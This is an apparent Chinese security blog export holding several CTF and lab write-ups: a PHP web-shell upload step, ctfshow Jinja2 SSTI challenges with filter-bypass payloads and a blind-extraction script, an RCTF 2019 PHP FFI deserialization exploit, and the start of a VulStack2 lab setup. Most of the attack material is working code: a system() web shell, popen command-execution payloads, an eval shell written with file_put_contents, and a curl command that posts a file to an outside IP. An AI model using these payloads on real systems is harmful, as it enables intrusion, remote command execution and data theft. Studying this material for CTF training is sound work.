<p>写一句话到phar文件并上传</p>
<pre><code>&lt;?php if(isset($_REQUEST[&#39;cmd&#39;]))&#123;echo &quot;&lt;pre&gt;&quot;;$cmd = ($_REQUEST[&#39;cmd&#39;]);system($cmd);echo &quot;&lt;/pre&gt;&quot;;die;&#125;?&gt;
</code></pre>
]]></content>
      <categories>
        <category>渗透测试</category>
        <category>Nday复现</category>
      </categories>
  </entry>
  <entry>
    <title>SSTI模板注入</title>
    <url>/2022/10/18/ctfshow-ssti/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>基础知识</strong></p>
<pre><code>__class__               类的内置属性，表示实例对象的类
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的子类集合
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;
current_app          应用上下文，一个全局变量。
</code></pre>
<p><strong>常见封装器</strong></p>
<pre><code>int()：将值转换为int类型；

float()：将值转换为float类型；

lower()：将字符串转换为小写；

upper()：将字符串转换为大写；

title()：把值中的每个单词的首字母都转成大写；

capitalize()：把变量值的首字母转成大写，其余字母转小写；

trim()：截取字符串前面和后面的空白字符；

wordcount()：计算一个长字符串中单词的个数；

reverse()：字符串反转；

replace(value,old,new)： 替换将old替换为new的字符串；

truncate(value,length=255,killwords=False)：截取length长度的字符串；

striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；

escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。

safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;'<em>hello</em>'|safe&#125;&#125;；

list()：将变量列成列表；

string()：将变量转换成字符串；

join()：将一个序列中的参数值拼接成字符串。示例看上面payload；

abs()：返回一个数值的绝对值；

first()：返回一个序列的第一个元素；

last()：返回一个序列的最后一个元素；

format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; "%s" - "%s"|format('Hello?',"Foo!") &#125;&#125;将输出：Helloo? - Foo!

length()：返回一个序列或者字典的长度；

sum()：返回列表内数值的和；

sort()：返回排序后的列表；

default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。

length()返回字符串的长度，别名是count
</code></pre>
<h1 id="Web361"><a href="#Web361" class="headerlink" title="Web361"></a>Web361</h1><p>注入参数 name</p>
<pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('cat /flag').read()&#125;&#125;
</code></pre>
<p>利用os.__wrap_close类</p>
<h1 id="WEB362"><a href="#WEB362" class="headerlink" title="WEB362"></a>WEB362</h1><p>利用os.__wrap_close类</p>
<p>用法如下</p>
<p><img src="https://s2.loli.net/2022/10/18/D5h7xVTK2wkO3YJ.png" alt="image.png"></p>
<pre><code>&#123;&#123;().__class__.__mro__[1].__subclasses__()[407]('cat /flag',stdout=-1,shell=True).communicate()[0]&#125;&#125;
</code></pre>
<p>利用subprocess.Popen类</p>
<h1 id="WEB363"><a href="#WEB363" class="headerlink" title="WEB363"></a>WEB363</h1><p>单引号被绕过，用request来绕过</p>
<pre><code>&#123;&#123;().__class__.__mro__[1].__subclasses__()[407](request.args.a,shell=True,stdout=-1).communicate()[0]&#125;&#125;&amp;a=cat /flag
</code></pre>
<p>利用subprocess.popen类</p>
<h1 id="WEB364"><a href="#WEB364" class="headerlink" title="WEB364"></a>WEB364</h1><p>过滤单双引号，args，把args换成values</p>
<pre><code>&#123;&#123;().__class__.__mro__[1].__subclasses__()[407](request.values.a,shell=True,stdout=-1).communicate()[0]&#125;&#125;&amp;a=cat /flag
</code></pre>
<p>利用subprocess.popen类</p>
<h1 id="WEB365"><a href="#WEB365" class="headerlink" title="WEB365"></a>WEB365</h1><p>过滤方括号，单引号，方括号用__getitem__绕过</p>
<pre><code>&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(407)(request.values.a,shell=True,stdout=-1).communicate().__getitem__(0)&#125;&#125;&amp;a=cat /flag
</code></pre>
<p>也可以用POP</p>
<pre><code>&#123;&#123;().__class__.__mro__.__getitem__(1).__subclasses__().pop(407)(request.values.a,shell=True,stdout=-1).communicate().__getitem__(0)&#125;&#125;&amp;a=cat /flag
</code></pre>
<p>利用subclasses.popen类</p>
<h1 id="WEB366"><a href="#WEB366" class="headerlink" title="WEB366"></a>WEB366</h1><p>在前面基础还过滤下划线_,使用过滤器attr</p>
<pre><code>?name=&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;
Cookie:a=__globals__;b=cat /flag
</code></pre>
<p>利用lipsum.__globals__类,存在os类</p>
<pre><code>GET：?name=&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)&#125;&#125;
 
Cookie:x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()
</code></pre>
<pre><code>&quot;&quot;|attr(&quot;__class__&quot;)
相当于
&quot;&quot;.class
</code></pre>
<p>也可以这样写</p>
<pre><code>&#123;&#123;lipsum.__globals__.os.popen(request.values.a).read()&#125;&#125;&amp;a =cat /flag
</code></pre>
<pre><code>&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__
</code></pre>
<h1 id="WEB367"><a href="#WEB367" class="headerlink" title="WEB367"></a>WEB367</h1><p>过滤了os，将os写入request</p>
<pre><code>&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)&#125;&#125;
 
Cookie:x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()
</code></pre>
<h1 id="WEB368"><a href="#WEB368" class="headerlink" title="WEB368"></a>WEB368</h1><p>过滤<code>&#123;&#123;`，`&#123;&#123;&#125;&#125;</code>里过滤，未在<code>&#123;%%&#125;</code>过滤</p>
<pre><code>&#123;%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %&#125;&amp;a=__globals__&amp;b=os&amp;c=cat /flag
</code></pre>
<p>使用<code>&#123;%``%&#125;</code>可盲注，原理是open(‘&#x2F;flag’).read()是回显整个文件，但是read函数里加上参数：open(‘&#x2F;flag’).read(1)，返回的就是读出所读的文件里的i个字符</p>
<p>搬一下feng师傅的脚本</p>
<pre><code>#使用&#123;% %&#125;可盲注
import requests

url=&quot;http://10ba3048-8b8a-4e5a-8a99-05ebc682bacd.challenge.ctf.show/&quot;

flag=&quot;&quot;
for i in range(1,100):
    for j in &quot;abcdefghijklmnopqrstuvwxyz0123456789-&#123;&#125;&quot;:
        params=&#123;
            &#39;name&#39;:&quot;&#123;&#123;% set a=(lipsum|attr(request.values.a)).get(request.values.b).open(request.values.c).read(&#123;&#125;) %&#125;&#125;&#123;&#123;% if a==request.values.d %&#125;&#125;feng&#123;&#123;% endif %&#125;&#125;&quot;.format(i),
            &#39;a&#39;:&#39;__globals__&#39;,
            &#39;b&#39;:&#39;__builtins__&#39;,
            &#39;c&#39;:&#39;/flag&#39;,
            &#39;d&#39;:f&#39;&#123;flag+j&#125;&#39;
        &#125;
        r=requests.get(url=url,params=params)
        if &quot;feng&quot; in r.text:
            flag+=j
            print(flag)
            if j==&quot;&#125;&quot;:
                exit()
            break
</code></pre>
<h1 id="WEB369"><a href="#WEB369" class="headerlink" title="WEB369"></a>WEB369</h1><p>过滤request和一些零散的字符串，可以拼接绕过</p>
<p>前置知识：</p>
<pre><code>(()|select|string|list).pop(0) #获取下划线_

dict(__clas=a,s__=b)|join 获取__class__
</code></pre>
<p>获取可用字符串</p>
<pre><code>&#123;%print%20lipsum|select|string|list%&#125;
</code></pre>
<p><img src="https://s2.loli.net/2022/10/18/83NXfExHkmWv4wo.png" alt="image.png"></p>
<p>获取下划线</p>
<pre><code>&#123;%print%20(lipsum|select|string|list).pop(24)%&#125;
</code></pre>
<p>如过滤数字</p>
<pre><code>&#123;%set%20xiahua=(lipsum|select|string|list).pop(24)%&#125;
&#123;%set gb=(xiahua,xiahua,dict(glo=a,bals=a)|join,xiahua,xiahua)|join%&#125;
&#123;%set gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%&#125;
&#123;%set oo=dict(o=a,s=a)|join%&#125;
&#123;%set pp=dict(po=a,pen=a)|join%&#125;
&#123;%set shell=dict(l=a,s=a)|join%&#125;
&#123;%print (lipsum|attr(gb)|attr(gm)(oo)|attr(pp)(shell)).read()%&#125;

(lipsum|attr(globals)|attr(getitem(os))|atr(popen(ls)).read())
</code></pre>
<p>斜杠，反斜杠，空格这样的特殊字符list里没有，然后如果要命令执行的话，又是不可缺少的，所以可以用chr来构建</p>
<p>例如以下语句</p>
<pre><code>lipsum.__globals__[&#39;__builtins__&#39;].chr
</code></pre>
<pre><code>&#123;%set%20xiahua=(lipsum|select|string|list).pop(24)%&#125;
&#123;%set gb=(xiahua,xiahua,dict(glo=a,bals=a)|join,xiahua,xiahua)|join%&#125;
&#123;%set gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%&#125;
&#123;%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%&#125;
&#123;%print (lipsum|attr(gb)|attr(gm)(bl)).chr%&#125;
</code></pre>
<p>获得chr函数</p>
<p>构造得到空格，和斜杠</p>
<pre><code>&#123;%set%20xiahua=(lipsum|select|string|list).pop(24)%&#125;
&#123;%set gb=(xiahua,xiahua,dict(glo=a,bals=a)|join,xiahua,xiahua)|join%&#125;
&#123;%set gm=(xiahua,xiahua,dict(ge=a,titem=a)|join,xiahua,xiahua)|join%&#125;
&#123;%set bl=(xiahua,xiahua,dict(builtins=a)|join,xiahua,xiahua)|join%&#125;
&#123;%set chcr=(lipsum|attr(gb)|attr(gm)(bl)).chr%&#125;
&#123;%set oo=dict(o=a,s=a)|join%&#125;
&#123;%set pp=dict(po=a,pen=a)|join%&#125;
&#123;%set space=chcr(32)%&#125;
&#123;%set xiegang=chcr(47)%&#125;
&#123;%set shell=(dict(ls=a)|join,space,xiegang)|join%&#125;
&#123;%print lipsum|attr(gb)|attr(gm)(oo)|attr(pp)(shell)|attr(dict(re=a,ad=a)|join)()%&#125;
</code></pre>
<p>得到文件</p>
<p>yu师傅的</p>
<pre><code>?name=
&#123;% set po=dict(po=a,p=a)|join%&#125;
&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;
&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;
&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;
&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;
&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;
&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;
&#123;% set chr=x.chr%&#125;
&#123;% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;
&#123;%print(x.open(file).read())%&#125;
</code></pre>
<p>这样的拼接不需要单双引号，直接构造函数就使用</p>
<h1 id="WEB370"><a href="#WEB370" class="headerlink" title="WEB370"></a>WEB370</h1><p>过滤print，可用拼接绕过</p>
<p>构造<strong>lipsum.globals</strong></p>
<pre><code>&#123;% set o=(dict(o=z)|join) %&#125;
&#123;% set n=dict(n=z)|join %&#125;
&#123;% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %&#125;
&#123;% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %&#125;
&#123;% set xiegang=(config|string|list).pop(-liushisi) %&#125;
&#123;% set gang=(()|select|string|list).pop(ershisi) %&#125;
&#123;% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %&#125;
&#123;% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %&#125;
&#123;% set gangfulaige=(xiegang,dict(flag=z)|join)|join %&#125;
&#123;% print (lipsum|attr(globals)).get(builtins).open(gangfulaige).read() %&#125;
</code></pre>
]]></content>
      <categories>
        <category>CTF刷题</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>[RCTF 2019]Nextphp（PHP7.4特性）</title>
    <url>/2022/10/10/BUUCTF%E5%88%B7%E9%A2%98/</url>
    <content><![CDATA[<h1 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h1><p><strong>参考</strong></p>
<p><a href="https://www.notion.so/BUU-caeec8b455ca4c30aa8c09b2a2fc6ed7#7652e9a652ce49deb47e77138eefb51c">参考文章1</a></p>
<p><a href="https://www.notion.so/BUU-caeec8b455ca4c30aa8c09b2a2fc6ed7#3725fed03775446c8bb2ed6d56d19513">参考文章2</a></p>
<p><strong>php 7.4 FFI扩展学习</strong></p>
<p>FFI是php7.4出的一个扩展，提供了高级语言直接调用，而对于PHP来说，FFI让我们可以方便的调用C语言写的各种库</p>
<p>参考网上博主资料，编写C语言的代码获取命令行窗开</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//Filename cli_size.c</span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>

<span class="token keyword">struct</span> winsize <span class="token function">get_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">struct</span> winsize size<span class="token punctuation">;</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span>TIOCGWINSZ<span class="token punctuation">,</span><span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> size<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token function">get_cil_rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">struct</span> winsize size<span class="token punctuation">;</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span>TIOCGWINSZ<span class="token punctuation">,</span><span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> size<span class="token punctuation">.</span>ws_row<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token function">get_cil_cols</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">struct</span> winsize size<span class="token punctuation">;</span>
    <span class="token function">ioctl</span><span class="token punctuation">(</span>STDIN_FILENO<span class="token punctuation">,</span>TIOCGWINSZ<span class="token punctuation">,</span><span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> size<span class="token punctuation">.</span>ws_col<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>定义结构体和两个函数</p>
<p>将c代码编译成动态链接库libcli_size.so</p>
<pre class=" language-c"><code class="language-c">gcc <span class="token operator">-</span>O2 <span class="token operator">-</span>fPIC <span class="token operator">-</span>shared <span class="token operator">-</span>g cli_size<span class="token punctuation">.</span>c <span class="token operator">-</span>o libcli_size<span class="token punctuation">.</span>so
</code></pre>
<p>使用php的 FFI:cdef()函数声明我们要调用的这个库中的<strong>函数</strong>以及使用到的<strong>数据类型</strong></p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">//filename cli_size.php</span>
<span class="token variable">$ffi</span><span class="token operator">=</span><span class="token constant">FFI</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">cdef</span><span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">CTYPE</span>
struct winsize<span class="token punctuation">{</span>
    unsigned short ws_row<span class="token punctuation">;</span>
    unsigned short ws_col<span class="token punctuation">;</span>
    unsigned short ws_xpixel<span class="token punctuation">;</span>
    unsigned short ws_ypixel<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
unsigned short <span class="token function">get_cli_rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
unsigned short <span class="token function">get_cli_cols</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
struct winsze <span class="token function">get_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token constant">CTYPE</span><span class="token punctuation">,</span><span class="token string">'libcli_size.so'</span><span class="token punctuation">)</span>

<span class="token operator">></span>
</code></pre>
<p>定义了声明CTYPE，调用winsize和get_cli_rows和get_cli_cols函数。</p>
<p>声明为FFI：：cdef的第一个参数，第二个参数为库文件名。</p>
<p><strong>如果不传入第二个参数可以直接调用PHP代码，下面EXP在声明后即可加入PHP代码</strong>。</p>
<p>调用</p>
<pre class=" language-php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_cli_rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_cli_cols</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>输出</p>
<pre class=" language-php"><code class="language-php"><span class="token function">int</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">// get_cli_rows()的结果</span>
<span class="token function">int</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// get_cli_cols()的结果</span>
<span class="token function">object</span><span class="token punctuation">(</span><span class="token constant">FFI</span>\<span class="token package"><span class="token punctuation">\</span>CData</span><span class="token punctuation">:</span>struct winsize<span class="token punctuation">)</span><span class="token shell-comment comment">#2 (4) {    </span><span class="token comment" spellcheck="true">// get_size()的结果，也就是winsize结构体，</span>
  <span class="token punctuation">[</span><span class="token string">"ws_row"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
  <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span>
  <span class="token punctuation">[</span><span class="token string">"ws_col"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
  <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">)</span>
  <span class="token punctuation">[</span><span class="token string">"ws_xpixel"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
  <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">)</span>
  <span class="token punctuation">[</span><span class="token string">"ws_ypixel"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span>
  <span class="token function">int</span><span class="token punctuation">(</span><span class="token number">684</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token function">int</span><span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">// get_cli_rows()的结果</span>
</code></pre>
<p>unsigned short类型在这里变成了php的int, 结构体struct winsize变成了一个FFI\CData对象</p>
<p>从结构体对象获取属性值</p>
<pre class=" language-php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$ffi</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ws_row</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//输出int(36)</span>
</code></pre>
<p><strong>FFI利用原理</strong></p>
<p>调用C标准库的system函数，就会使用cdef去加载，cdef会把存放在system函数功能的动态链接库libc加载到内存里，这样PHP的进程空间就有system，这也就是disable_function过滤了system函数，结果的Payload也是用system的原因，是因为加载C库函数的system函数</p>
<p><strong>核心思想</strong>：</p>
<blockquote>
<p>实现用PHP代码调用C代码的方式，声明C的命令执行函数，然后通过FFI变量调用C函数即可Bypass disabe_functions</p>
</blockquote>
<p><strong>Serializable接口</strong></p>
<p><img src="https://s2.loli.net/2022/10/27/i2ucVGnEmOT9bAd.png" alt="image.png"></p>
<p>php表明一个类同时存在Serializable和__Serialize() &#x2F;_Unserialize()，则序列化将倾向使用新机制，而非序列化则使用其中一种机制，具体取决使用C（Serializable）还是O（Un unserialize）。以C格式编码的旧的序列化字符串仍可以解码，新的字符串将以O格式生成</p>
<p>所以等会遇到的脚本存在Serializable接口，使用序列化时旧决定使用C，也就是序列化后首字母为C而不是O。同时会执行Serializable接口的方法，且EXP需要把__Unserialize()删掉。</p>
<p>Serializable为自定义序列化接口，实现此接口的类不支持__sleep()和__wakeup()，当类实例被序列化将在自动调用serialize方法，不会调用__destruct()。当类的实例被反序列化，将调用unserialize方法，不执行__construct()</p>
<h1 id="0x01-解题思路"><a href="#0x01-解题思路" class="headerlink" title="0x01 解题思路"></a>0x01 解题思路</h1><p>打开代码仅有两行</p>
<pre><code>&lt;?php
if (isset($_GET[&#39;a&#39;])) &#123;
    eval($_GET[&#39;a&#39;]);
&#125; else &#123;
    show_source(__FILE__);
</code></pre>
<p>查看disable_function禁用了什么函数</p>
<p><img src="https://s2.loli.net/2022/10/27/oxag3r8sA5nHh12.png" alt="image.png"></p>
<p>尝试file_put_contents写shell，在使用蚁剑插件绕过disable_functions，但是没有那么简单</p>
<pre><code>file_put_contents(&#39;gt.php&#39;,&#39;&lt;?php eval($_REQUEST[gt]);?&gt;&#39;);
</code></pre>
<p>文件里有个preload.php，看一下</p>
<p><img src="https://s2.loli.net/2022/10/27/vsgIyQThVuEqMza.png" alt="image.png"></p>
<pre><code>&lt;?php
final class A implements Serializable &#123;
    protected $data = [
        &#39;ret&#39; =&gt; null,
        &#39;func&#39; =&gt; &#39;print_r&#39;,
        &#39;arg&#39; =&gt; &#39;1&#39;
    ];

    private function run () &#123;
        $this-&gt;data[&#39;ret&#39;] = $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);
    &#125;

    public function __serialize(): array &#123;
        return $this-&gt;data;
    &#125;

    public function __unserialize(array $data) &#123;
        array_merge($this-&gt;data, $data);
        $this-&gt;run();
    &#125;

    public function serialize (): string &#123;
        return serialize($this-&gt;data);
    &#125;

    public function unserialize($payload) &#123;
        $this-&gt;data = unserialize($payload);
        $this-&gt;run();
    &#125;

    public function __get ($key) &#123;
        return $this-&gt;data[$key];
    &#125;

    public function __set ($key, $value) &#123;
        throw new \Exception(&#39;No implemented&#39;);
    &#125;

    public function __construct () &#123;
        throw new \Exception(&#39;No implemented&#39;);
    &#125;
&#125;
</code></pre>
<p>以Serializable接口调用serialize方法，且传递三个属性ret、func、arg，并没有用户传参</p>
<pre><code>以Serializable接口调用serialize方法，且传递三个属性ret、func、arg，并没有用户传参
</code></pre>
<p>构造反序列化在a里面调用__get(’ret’)输出值，可控arg和func。</p>
<p><strong>注意</strong>：php7.4新特性会优先触发__serialize和__unserialize方法，需要删掉</p>
<p>EXP</p>
<pre><code>&lt;?php
final class A implements Serializable &#123;
    protected $data = [
        &#39;ret&#39; =&gt; null,
        &#39;func&#39; =&gt; &#39;FFI::cdef&#39;,  
        &#39;arg&#39; =&gt; &#39;int system(const char *command);&#39;
    ];
# FFI::cdef int system(constchar * command);
    
    public function serialize(): string&#123;
        return serialize($this-&gt;data);
    &#125;

    public function unserialize($payload) &#123;
        $this-&gt;data = unserialize($payload);
        
    &#125;
&#125;
 
$a=new A();
$b= serialize($a);
echo $b;
</code></pre>
<p>序列化结果为</p>
<pre><code>C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;
</code></pre>
<p>实现了声明</p>
<pre><code>FFI::cdef(&quot;int system(const char *command);&quot;)
</code></pre>
<p>还需要调用，设置 __serialize()[’ret’]值获取flag</p>
<pre><code>__serialize()[’ret’]-&gt;system(’curl -d @/flag IP’)
</code></pre>
<p>完整的Payload</p>
<pre><code>?a=$a=unserialize(&#39;C:1:&quot;A&quot;:95:&#123;a:3:&#123;s:3:&quot;ret&quot;;N;s:4:&quot;func&quot;;s:9:&quot;FFI::cdef&quot;;s:3:&quot;arg&quot;;s:32:&quot;int system(const char *command);&quot;;&#125;&#125;&#39;)-&gt;__serialize()[&#39;ret&#39;]-&gt;system(&#39;curl -d @/flag 192.168.50.246:9528&#39;);
</code></pre>
<p>传参流程</p>
<p>1.unserialize</p>
<p>将payload传递给idata参数，覆盖原来参数</p>
<pre><code>protected $data = [
        &#39;ret&#39; =&gt; null,
        &#39;func&#39; =&gt; &#39;print_r&#39;,
        &#39;arg&#39; =&gt; &#39;1&#39;
    ];
</code></pre>
<p>2.run</p>
<p>将新值带入ret，ret为FFI::cdef int system(constchar * command);</p>
<p>3.__serialize()</p>
<p>指定ret为最终执行命令，通过最后return调用，返回flag</p>
<p>还可以直接写入文件</p>
<pre><code>?a=unserialize(base64_decode(&#39;QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319&#39;))-&gt;__serialize()[&#39;ret&#39;]-&gt;system(&#39;cat /flag&gt;/var/www/html/1.txt&#39;);
</code></pre>
]]></content>
      <categories>
        <category>CTF刷题</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>[靶场练习]ATT&amp;CK-2</title>
    <url>/2022/10/06/ATT&amp;CK-2/</url>
    <content><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>红日靶机系列是完全模拟ATT&amp;CK攻击链路来搭建的，VulStack2主要涉及Access Token利用WMI利用、域漏洞利用SMB relay，EWS relay，PTT(PTC)，MS14-068，GPP，SPN利用、黄金票据&#x2F;白银票据&#x2F;Sid History&#x2F;MOF等攻防技术等知识</p>
<p><img src="https://s2.loli.net/2022/10/06/HEgvrPU9caLBDmk.png" alt="image.png"></p>
<h1 id="0x01-靶场环境搭建"><a href="#0x01-靶场环境搭建" class="headerlink" title="0x01 靶场环境搭建"></a>0x01 靶场环境搭建</h1><p>靶场中包含三台靶机，具体的网络拓扑图如下</p>
<p><img src="https://s2.loli.net/2022/10/06/gRXmaGIwVjbdWqs.png" alt="image.png"></p>
<p>配置需求：</p>
<p>1.外网统一为桥接模式，内网设置为仅主机模式</p>
<p>2.WEB外网服务器需要打开weblogic服务，路径为C:\Oracle\Middleware\user_projects\domains\base_domain\bin，将startWeblogic打开</p>
<p>3.三台靶机的默认开机密码都为1qaz@WSX，管理员账号密码：Administrator&#x2F;1qaz@WSX，WEB外网服务器需单独使用de1ay&#x2F;1qaz@WSX登录</p>
<p>访问192.168.50.238:7001&#x2F;console,出现weblogic页面，漏洞环境搭建成功</p>
